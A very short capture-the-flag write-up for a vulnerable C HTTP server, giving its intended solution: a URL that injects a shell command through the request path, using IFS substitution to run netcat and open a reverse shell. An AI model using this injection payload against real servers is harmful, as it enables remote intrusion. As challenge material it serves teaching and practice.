# Ghostly statistic panel
A vulnerable http server written in c. This is the intended solution:
```
http://127.0.0.1:8084/proc/1/stat;IFS=_;command='nc_127.0.0.1_9001_-e_/bin/sh';$command;
```

